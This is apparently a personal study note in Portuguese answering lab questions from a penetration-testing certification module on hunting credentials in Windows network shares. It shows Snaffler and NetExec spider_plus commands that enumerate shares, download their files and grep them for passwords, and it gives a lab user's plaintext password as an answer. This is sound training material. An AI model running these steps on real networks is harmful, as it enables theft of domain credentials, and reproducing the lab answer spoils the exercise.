> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/password-attacks/credential-hunting-in-network-shares/questions.md).

# Questions

1. Uma das pastas compartilhadas às quais Mendres tem acesso contém credenciais válidas de outro usuário do domínio. Qual é a senha dele?

* Encontrar recursivamente todos os arquivos e pastas acessíveis em unidades compartilhadas com o Snaffler

```
Snaffler.exe -s
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FTXVSLV2HpGZC5p3gMYOX%2Fimage.png?alt=media&amp;token=722d7e71-24cf-4a2e-ac9a-bcf33563a946" alt=""><figcaption></figcaption></figure>

* Encontrei a primeira credencial neste caminho `\DC01.inlanefreight.local\IT\Tools\split_tunnel.txt`

<div align="left"><figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FcAtRzQFTBlDDuzUIlCdZ%2Fimage.png?alt=media&amp;token=6163665e-e9fd-4909-be98-31754144e9d9" alt=""><figcaption></figcaption></figure></div>

***

2. Como esse usuário, pesquise entre os compartilhamentos adicionais aos quais ele tem acesso e identifique a senha de um administrador de domínio. Qual é ela?

* Usei as credenciais de jbader para enumerar os compartilhamentos adicionais com `nxc`

```
nxc smb <Target Ip> -u jbader -p ILovePower333### -M spider_plus -o DOWNLOAD_FLAG=True --smb-timeout 60
```

* **`-M spider_plus`** Isso instrui o NetExec a executar o módulo `spider_plus`
* **`-o DOWNLOAD_FLAG=True`**&#x45;ssa opção crucial instrui `spider_plus`o download de todos os arquivos encontrados para o nosso computador.&#x20;
* Para acessar esses arquivos, navegue até o seguinte diretório:&#x20;

```
cd /tmp/nxc_hosted/nxc_spider_plus/<target-IP>
```

* Podemos começar a procurar informações confidenciais, principalmente credenciais.

```
grep -ri "passw" .
```

<figure><img src="https://4024756925-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FZbLrq3t9Su3CqGmkXz7o%2Fuploads%2FOhiPGcTUCSOdUEt4fe8t%2Fimage.png?alt=media&amp;token=d726d048-02bd-45b5-8cbd-fcc70ed51c73" alt=""><figcaption></figcaption></figure>
